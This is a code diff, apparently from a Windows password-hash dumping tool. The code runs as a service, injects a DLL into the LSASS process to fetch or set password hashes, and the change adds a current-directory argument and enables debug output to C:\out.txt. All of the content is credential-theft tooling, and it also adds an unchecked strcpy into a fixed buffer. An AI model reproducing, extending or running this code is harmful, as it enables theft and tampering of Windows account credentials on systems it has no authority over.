@@ -231,7 +231,7 @@ ULONG GetLsassPid()
     return ret;
 }
 
-void InjectDll(HANDLE hProc, bool setPasswordHash, char* szDllPath, LPCTSTR lpszPipeName, BYTE* pEncryptionKey, DWORD dwKeyLen, BOOL bSkipHistories)
+void InjectDll(HANDLE hProc, bool setPasswordHash, char *szCurrentDirectory, char* szDllPath, LPCTSTR lpszPipeName, BYTE* pEncryptionKey, DWORD dwKeyLen, BOOL bSkipHistories)
 {
     SIZE_T sizetFuncSize;
     SIZE_T sizetBytesToAlloc;
@@ -243,7 +243,7 @@ void InjectDll(HANDLE hProc, bool setPasswordHash, char* szDllPath, LPCTSTR lpsz
     DWORD trc = 3;
     DWORD dwIgnored;
 
-	//FILE* f = fopen("C:\\out.txt", "w");
+	FILE* f = fopen("C:\\out.txt", "w");
 
 	//fprintf(f, "Starting DLL injection...\n");
 	//fprintf(f, "DLL path is %s\n", szDllPath);
@@ -264,6 +264,9 @@ void InjectDll(HANDLE hProc, bool setPasswordHash, char* szDllPath, LPCTSTR lpsz
 	} else {
 		strncpy(rtData.szFuncName, "GetHash", sizeof(rtData.szFuncName));
 	}
+	strcpy(rtData.szCurrentDirectory, szCurrentDirectory);
+	fprintf(f, "currentDirectory: %s\n", szCurrentDirectory);
+	//GetCurrentDirectory(sizeof(rtData.szCurrentDirectory), rtData.szCurrentDirectory);
 
 	// Dictate if we are skipping password histories
 	rtData.bSkipHistories = bSkipHistories;
@@ -336,7 +339,7 @@ void InjectDll(HANDLE hProc, bool setPasswordHash, char* szDllPath, LPCTSTR lpsz
     }
 
  exit:
-	//fclose(f);
+	fclose(f);
 
     //clean up
     if(hRemoteThread) 
@@ -356,11 +359,12 @@ void __stdcall PWServMain(int argc, char* argv[])
 	DWORD dwKeyLen = *(argv[3]);
 	BOOL bSkipHistories = *(argv[4]);
 	char* szDllName = argv[6];
+	char* szCurrentDirectory = argv[7];
 	bool setPasswordHash = false;
-	if (!strcmp("set", argv[7])) {
+
+	if (!strcmp("set", argv[8])) {
 		setPasswordHash = true;
 	}
-
 
     hSrv = RegisterServiceCtrlHandler(srvName, (LPHANDLER_FUNCTION)PWServHandler);
     if(hSrv == NULL) 
@@ -390,7 +394,7 @@ void __stdcall PWServMain(int argc, char* argv[])
     TellSCM(SERVICE_RUNNING, 0, 0);
 
     // Inject the dll
-    InjectDll(hLsassProc, setPasswordHash, szDllName, szPipeName, pEncryptionKey, dwKeyLen, bSkipHistories);
+    InjectDll(hLsassProc, setPasswordHash, szCurrentDirectory, szDllName, szPipeName, pEncryptionKey, dwKeyLen, bSkipHistories);
 
 exit:
     TellSCM(SERVICE_STOP_PENDING, 0, 0);
